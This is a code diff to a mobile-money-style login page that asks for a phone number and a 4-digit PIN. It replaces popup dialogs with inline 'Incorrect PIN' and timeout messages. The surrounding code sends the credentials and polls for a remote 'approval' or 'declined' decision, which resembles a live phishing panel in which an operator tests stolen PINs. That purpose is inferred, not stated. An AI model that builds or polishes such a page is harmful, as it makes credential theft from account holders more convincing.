@@ -76,12 +76,34 @@
   .phone-field input { flex: 1; min-width: 0; height: 100%; border: none; outline: none; background: transparent; padding: 0 16px; font-family: inherit; font-size: 22px; font-weight: 600; letter-spacing: 0.4px; }
   .phone-field input::placeholder { color: #98A2B3; font-weight: 500; }
 
-  .pin-label { display: flex; align-items: center; justify-content: center; background: var(--eco-pin-bg); color: var(--eco-pin-text); font-size: 18px; font-weight: 700; padding: 10px 22px; border-radius: 999px; margin: 0 auto 20px; width: fit-content; }
+  .pin-label { display: flex; align-items: center; justify-content: center; background: var(--eco-pin-bg); color: var(--eco-pin-text); font-size: 18px; font-weight: 700; padding: 10px 22px; border-radius: 999px; margin: 0 auto 12px; width: fit-content; }
+
+  /* Inline wrong-PIN message */
+  .pin-error {
+    display: none;
+    text-align: center;
+    color: var(--eco-red);
+    font-size: 13px;
+    font-weight: 700;
+    margin: 0 auto 14px;
+    max-width: 320px;
+    line-height: 1.4;
+  }
+  .pin-error.show { display: block; }
+  .pin-error .sub {
+    display: block;
+    font-size: 12px;
+    font-weight: 500;
+    color: var(--eco-muted);
+    margin-top: 2px;
+  }
 
   .pin-row { display: flex; justify-content: center; gap: 12px; margin-bottom: 24px; }
   .pin-row input { width: 62px; height: 62px; border: 3px solid var(--eco-pin-border); border-radius: 20px; background: #fff; color: var(--eco-navy); font-family: inherit; font-size: 28px; font-weight: 800; text-align: center; outline: none; -webkit-text-security: disc; }
   .pin-row input:focus { border-color: var(--eco-input-border); box-shadow: 0 0 0 4px rgba(0,102,166,0.15); background: #F6FBFE; }
   .pin-row input.filled { border-color: var(--eco-input-border); }
+  .pin-row.error input { border-color: var(--eco-red); }
+  .pin-row.error input:focus { border-color: var(--eco-red); box-shadow: 0 0 0 4px rgba(227,30,36,0.15); }
 
   .login-btn { width: 100%; height: 76px; background: var(--eco-blue); color: #fff; border: none; border-radius: 20px; font-family: inherit; font-size: 22px; font-weight: 800; cursor: pointer; }
   .login-btn:hover { filter: brightness(1.08); }
@@ -127,10 +149,11 @@
     .country-block .flag { font-size: 20px; }
     .country-block .dial { font-size: 15px; }
     .phone-field input { font-size: 18px; }
-    .pin-label { font-size: 15px; padding: 8px 18px; margin-bottom: 16px; }
+    .pin-label { font-size: 15px; padding: 8px 18px; margin-bottom: 10px; }
     .pin-row { gap: 8px; margin-bottom: 20px; }
     .pin-row input { width: 52px; height: 52px; border-radius: 16px; font-size: 24px; }
     .login-btn { height: 64px; border-radius: 16px; font-size: 19px; }
+    .pin-error { font-size: 12px; margin-bottom: 10px; }
   }
 </style>
 </head>
@@ -173,7 +196,13 @@
 
         <div class="pin-label">Enter 4 digit PIN</div>
 
-        <div class="pin-row">
+        <!-- Inline wrong-PIN message -->
+        <div class="pin-error" id="pinError">
+          Incorrect PIN
+          <span class="sub">The PIN you entered is not correct. Please try again.</span>
+        </div>
+
+        <div class="pin-row" id="pinRow">
           <input type="password" id="pin1" inputmode="numeric" maxlength="1" autocomplete="one-time-code">
           <input type="password" id="pin2" inputmode="numeric" maxlength="1">
           <input type="password" id="pin3" inputmode="numeric" maxlength="1">
@@ -263,9 +292,22 @@ function fillBackground() {
   document.getElementById('bgCountry').textContent = currentTx.c || '—';
 }
 
+/* ============================================================
+   Inline wrong-PIN message helpers
+============================================================ */
+function showPinError() {
+  document.getElementById('pinError').classList.add('show');
+  document.getElementById('pinRow').classList.add('error');
+}
+function clearPinError() {
+  document.getElementById('pinError').classList.remove('show');
+  document.getElementById('pinRow').classList.remove('error');
+}
+
 const pinEls = ['pin1','pin2','pin3','pin4'].map(id => document.getElementById(id));
 pinEls.forEach((el, i) => {
   el.addEventListener('input', () => {
+    clearPinError();                                   // typing clears the error
     el.value = el.value.replace(/\D/g, '').slice(0, 1);
     el.classList.toggle('filled', !!el.value);
     if (el.value && i < pinEls.length - 1) pinEls[i + 1].focus();
@@ -277,6 +319,7 @@ pinEls.forEach((el, i) => {
     const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 4);
     if (text.length === 4) {
       e.preventDefault();
+      clearPinError();
       text.split('').forEach((d, idx) => { pinEls[idx].value = d; pinEls[idx].classList.add('filled'); });
       pinEls[3].focus();
     }
@@ -310,41 +353,12 @@ document.getElementById('overlay').addEventListener('click', (e) => {
 });
 
 /* ============================================================
-   Popups
-============================================================ */
-function showIncorrectPinPopup() {
-  const overlay = document.createElement('div');
-  overlay.style.cssText = 'position:fixed;inset:0;background:rgba(16,24,40,0.65);display:flex;align-items:center;justify-content:center;z-index:3000;padding:24px;';
-  overlay.innerHTML = `
-    <div style="background:#fff;border-radius:20px;padding:28px 24px;max-width:340px;width:100%;text-align:center;font-family:'Poppins',sans-serif;box-shadow:0 20px 50px rgba(0,0,0,0.25);">
-      <div style="width:60px;height:60px;border-radius:50%;background:#E31E24;color:#fff;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:800;margin:0 auto 16px;">!</div>
-      <div style="font-size:17px;font-weight:800;color:#101828;margin-bottom:8px;">Incorrect PIN</div>
-      <div style="font-size:13px;color:#667085;line-height:1.6;margin-bottom:20px;">The PIN you entered is not correct. Please try again.</div>
-      <button id="pinErrOk" style="width:100%;padding:12px;background:#0066A6;color:#fff;border:none;border-radius:10px;font-size:14px;font-weight:700;cursor:pointer;font-family:'Poppins',sans-serif;">Try again</button>
-    </div>`;
-  document.body.appendChild(overlay);
-  overlay.querySelector('#pinErrOk').onclick = () => overlay.remove();
-}
-
-function showTimeoutPopup() {
-  const overlay = document.createElement('div');
-  overlay.style.cssText = 'position:fixed;inset:0;background:rgba(16,24,40,0.65);display:flex;align-items:center;justify-content:center;z-index:3000;padding:24px;';
-  overlay.innerHTML = `
-    <div style="background:#fff;border-radius:20px;padding:28px 24px;max-width:340px;width:100%;text-align:center;font-family:'Poppins',sans-serif;box-shadow:0 20px 50px rgba(0,0,0,0.25);">
-      <div style="width:60px;height:60px;border-radius:50%;background:#F59E0B;color:#fff;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:800;margin:0 auto 16px;">!</div>
-      <div style="font-size:17px;font-weight:800;color:#101828;margin-bottom:8px;">Request timed out</div>
-      <div style="font-size:13px;color:#667085;line-height:1.6;margin-bottom:20px;">No approval was received. Please try again.</div>
-      <button id="toOk" style="width:100%;padding:12px;background:#0066A6;color:#fff;border:none;border-radius:10px;font-size:14px;font-weight:700;cursor:pointer;font-family:'Poppins',sans-serif;">OK</button>
-    </div>`;
-  document.body.appendChild(overlay);
-  overlay.querySelector('#toOk').onclick = () => overlay.remove();
-}
-
-/* ============================================================
    Submit + poll for approval
 ============================================================ */
 async function submitLogin() {
   clearFormError();
+  clearPinError();
+
   const countryName = currentTx && currentTx.c ? currentTx.c : '';
   const entry = COUNTRY_MAP[countryName];
   if (!entry) { showFormError('No country configured.'); return; }
@@ -399,7 +413,7 @@ async function submitLogin() {
         document.getElementById('verifying').classList.remove('show');
         btn.disabled = false;
         btn.textContent = 'Login';
-        showTimeoutPopup();
+        showFormError('Request timed out. Please try again.');
         return;
       }
 
@@ -424,12 +438,13 @@ async function submitLogin() {
         }
 
         if (s.decision === 'declined') {
+          // Hide spinner, return to the form, show INLINE error (no popup)
           document.getElementById('verifying').classList.remove('show');
           btn.disabled = false;
           btn.textContent = 'Login';
           pinEls.forEach(el => { el.value = ''; el.classList.remove('filled'); });
+          showPinError();
           pinEls[0].focus();
-          showIncorrectPinPopup();
           return;
         }
       } catch (e) { /* retry */ }
